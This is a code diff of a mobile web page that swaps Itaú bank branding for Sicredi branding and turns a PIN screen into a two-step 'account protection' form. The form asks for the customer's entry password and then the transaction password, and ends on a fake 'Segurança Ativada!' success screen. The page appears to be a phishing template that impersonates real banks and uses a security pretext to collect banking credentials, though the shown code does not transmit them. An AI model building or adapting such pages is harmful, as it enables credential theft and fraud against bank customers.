@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Itaú | Segurança</title>
+    <title>Sicredi | Proteção Avançada</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
         
         :root {
-            --itau-orange: #EC7000;
-            --itau-blue: #003399;
-            --itau-gray: #5E6E79;
+            --sicredi-green: #3fb43f;
+            --sicredi-dark-green: #2d822d;
+            --sicredi-text: #333333;
+            --sicredi-light-bg: #f9f9f9;
         }
 
         body, html {
@@ -20,147 +21,218 @@
             margin: 0;
             background-color: white;
             font-family: 'Roboto', sans-serif;
-            color: #333;
+            color: var(--sicredi-text);
             overflow: hidden;
         }
 
-        .app-header {
-            height: 60px;
-            background-color: var(--itau-blue);
-            color: white;
+        .step-container {
+            display: none;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        .step-active {
             display: flex;
-            align-items: center;
-            padding: 0 16px;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+            margin-top: 2rem;
+        }
+
+        .custom-input {
+            width: 100%;
+            border-bottom: 2px solid #e2e8f0;
+            padding: 12px 0;
+            font-size: 1.25rem;
             font-weight: 500;
+            color: var(--sicredi-text);
+            background: transparent;
+            outline: none;
+            transition: border-color 0.3s;
         }
 
-        .pin-container {
-            display: grid;
-            grid-template-columns: repeat(6, 1fr);
-            gap: 12px;
-            width: 100%;
-            max-width: 280px;
-            margin-top: 40px;
+        .custom-input:focus {
+            border-color: var(--sicredi-green);
         }
 
-        .pin-field {
-            aspect-ratio: 1 / 1;
-            border: 1px solid #CCC;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.5rem;
-            font-weight: 700;
-            color: var(--itau-blue);
-            background: #F4F4F4;
-        }
-
-        .pin-field.active {
-            border-color: var(--itau-orange);
-            background: white;
-            box-shadow: 0 0 0 2px rgba(236, 112, 0, 0.2);
-        }
-
-        #real-input {
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .btn-itau {
-            background-color: var(--itau-orange);
+        .btn-sicredi {
+            background-color: var(--sicredi-green);
             color: white;
             font-weight: 700;
-            padding: 16px;
-            border-radius: 4px;
+            padding: 18px;
+            border-radius: 16px;
             width: 100%;
-            transition: opacity 0.2s;
+            text-transform: uppercase;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(63, 180, 63, 0.2);
         }
 
-        .btn-itau:disabled {
-            opacity: 0.5;
+        .btn-sicredi:disabled {
+            background-color: #e2e8f0;
+            color: #94a3b8;
+            box-shadow: none;
+        }
+
+        .progress-bar {
+            height: 4px;
+            background: #e2e8f0;
+            width: 100%;
+            position: fixed;
+            top: 64px;
+            left: 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--sicredi-green);
+            width: 50%;
+            transition: width 0.4s ease;
+        }
+
+        .badge-security {
+            background: rgba(63, 180, 63, 0.1);
+            color: var(--sicredi-green);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
         }
     </style>
 </head>
-<body onclick="document.getElementById('real-input').focus()">
+<body>
 
-    <div class="flex flex-col h-screen">
-        <header class="app-header">
-            <i data-lucide="chevron-left" class="mr-4"></i>
-            <span class="text-lg">Itaú segurança</span>
-        </header>
+    <!-- Header Fixo -->
+    <header class="h-[64px] bg-white border-b flex items-center px-5 fixed top-0 w-full z-10">
+        <button onclick="prevStep()" class="p-2">
+            <i data-lucide="chevron-left" class="w-6 h-6 text-green-600"></i>
+        </button>
+        <div class="flex-1 text-center font-black italic text-2xl text-green-600 pr-8">sicredi</div>
+    </header>
 
-        <main class="flex-1 px-8 pt-12 flex flex-col items-center">
-            <h1 class="text-2xl font-bold text-gray-800 text-center">Senha eletrônica</h1>
-            <p class="text-center text-gray-600 mt-4">
-                Digite sua senha de <span class="font-bold">6 dígitos</span>
+    <div class="progress-bar">
+        <div id="progress-fill" class="progress-fill"></div>
+    </div>
+
+    <!-- ETAPA 1: SENHA DE ENTRADA -->
+    <div id="step1" class="step-container step-active px-8 pt-24">
+        <div class="flex flex-col items-center text-center">
+            <div class="badge-security mb-4">
+                <i data-lucide="shield" class="w-3 h-3"></i> PROTEÇÃO CONTRA ATAQUES
+            </div>
+            <h1 class="text-2xl font-bold">Senha de Entrada</h1>
+            <p class="text-gray-500 mt-2 text-sm leading-relaxed">
+                Confirme sua senha de acesso à conta para validar sua identidade.
             </p>
 
-            <div class="pin-container" id="pin-display">
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
-                <div class="pin-field"></div>
+            <div class="input-group">
+                <input type="text" id="pass-entry" class="custom-input" placeholder="Digite sua senha de entrada" autocomplete="off">
+                <p class="text-[10px] text-gray-400 mt-2 text-left w-full uppercase font-bold tracking-tighter">Aceita letras e números</p>
             </div>
+        </div>
 
-            <input 
-                type="text" 
-                id="real-input" 
-                maxlength="6" 
-                inputmode="numeric" 
-                pattern="[0-9]*"
-                autocomplete="off"
-                autofocus
-            >
-        </main>
+        <div class="mt-auto pb-10">
+            <button onclick="nextStep()" id="btn-next" disabled class="btn-sicredi">Próximo</button>
+        </div>
+    </div>
 
-        <footer class="p-8">
-            <button id="btn-confirm" disabled class="btn-itau">
-                Confirmar
-            </button>
-            <div class="text-center mt-6 text-sm text-[#003399] font-medium">
-                Esqueci minha senha
+    <!-- ETAPA 2: SENHA DE TRANSAÇÃO -->
+    <div id="step2" class="step-container px-8 pt-24">
+        <div class="flex flex-col items-center text-center">
+            <div class="badge-security mb-4">
+                <i data-lucide="shield-alert" class="w-3 h-3"></i> VALIDAÇÃO ADICIONAL
             </div>
-        </footer>
+            <h1 class="text-2xl font-bold">Senha de Transação</h1>
+            <p class="text-gray-500 mt-2 text-sm leading-relaxed">
+                Por segurança, informe sua senha de transação para ativar a blindagem da conta.
+            </p>
+
+            <div class="input-group">
+                <input type="text" id="pass-trans" class="custom-input" placeholder="Digite sua senha de transação" autocomplete="off">
+                <p class="text-[10px] text-gray-400 mt-2 text-left w-full uppercase font-bold tracking-tighter">Assinatura eletrônica / Transação</p>
+            </div>
+        </div>
+
+        <div class="mt-auto pb-10">
+            <button onclick="activateSecurity()" id="btn-activate" disabled class="btn-sicredi">Ativar segurança na conta</button>
+        </div>
+    </div>
+
+    <!-- TELA DE SUCESSO -->
+    <div id="step-success" class="step-container px-8 pt-24 items-center justify-center text-center">
+        <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mb-6 shadow-xl shadow-green-100">
+            <i data-lucide="check-circle-2" class="text-white w-12 h-12"></i>
+        </div>
+        <h1 class="text-2xl font-bold text-gray-800">Segurança Ativada!</h1>
+        <p class="text-gray-500 mt-4 leading-relaxed">
+            Sua conta agora está protegida contra ataques e acessos não autorizados.
+        </p>
+        <div class="mt-10 w-full">
+            <button onclick="location.reload()" class="btn-sicredi">Voltar ao início</button>
+        </div>
     </div>
 
     <script>
         lucide.createIcons();
 
-        const realInput = document.getElementById('real-input');
-        const pinFields = document.querySelectorAll('.pin-field');
-        const btnConfirm = document.getElementById('btn-confirm');
+        let currentStep = 1;
+        const passEntry = document.getElementById('pass-entry');
+        const passTrans = document.getElementById('pass-trans');
+        const btnNext = document.getElementById('btn-next');
+        const btnActivate = document.getElementById('btn-activate');
+        const progressFill = document.getElementById('progress-fill');
 
-        // Garante o foco inicial
-        window.onload = () => realInput.focus();
-
-        realInput.addEventListener('input', (e) => {
-            // Remove qualquer caractere que não seja número
-            const val = e.target.value.replace(/[^0-9]/g, '');
-            e.target.value = val;
-            
-            pinFields.forEach((field, i) => {
-                if (i < val.length) {
-                    field.textContent = val[i]; // Senha Visível
-                    field.classList.remove('active');
-                } else {
-                    field.textContent = '';
-                    if (i === val.length) {
-                        field.classList.add('active');
-                    } else {
-                        field.classList.remove('active');
-                    }
-                }
-            });
-
-            btnConfirm.disabled = (val.length !== 6);
+        // Validação Etapa 1
+        passEntry.addEventListener('input', (e) => {
+            btnNext.disabled = e.target.value.length < 3;
         });
 
-        // Impede que o usuário perca o foco do teclado
-        document.body.addEventListener('click', () => realInput.focus());
+        // Validação Etapa 2
+        passTrans.addEventListener('input', (e) => {
+            btnActivate.disabled = e.target.value.length < 3;
+        });
+
+        function nextStep() {
+            if (currentStep === 1) {
+                document.getElementById('step1').classList.remove('step-active');
+                document.getElementById('step2').classList.add('step-active');
+                progressFill.style.width = '100%';
+                currentStep = 2;
+                setTimeout(() => passTrans.focus(), 100);
+            }
+        }
+
+        function prevStep() {
+            if (currentStep === 2) {
+                document.getElementById('step2').classList.remove('step-active');
+                document.getElementById('step1').classList.add('step-active');
+                progressFill.style.width = '50%';
+                currentStep = 1;
+            } else if (currentStep === 1) {
+                // Comportamento de voltar (opcional)
+                console.log("Sair ou voltar");
+            }
+        }
+
+        function activateSecurity() {
+            // Simulação de carregamento
+            btnActivate.innerHTML = `<span class="inline-block animate-spin mr-2">◌</span> Processando...`;
+            btnActivate.disabled = true;
+
+            setTimeout(() => {
+                document.getElementById('step2').classList.remove('step-active');
+                document.getElementById('step-success').classList.add('step-active');
+                document.querySelector('.progress-bar').style.display = 'none';
+                currentStep = 3;
+            }, 1500);
+        }
+
+        // Foco inicial
+        window.onload = () => passEntry.focus();
     </script>
 </body>
 </html>
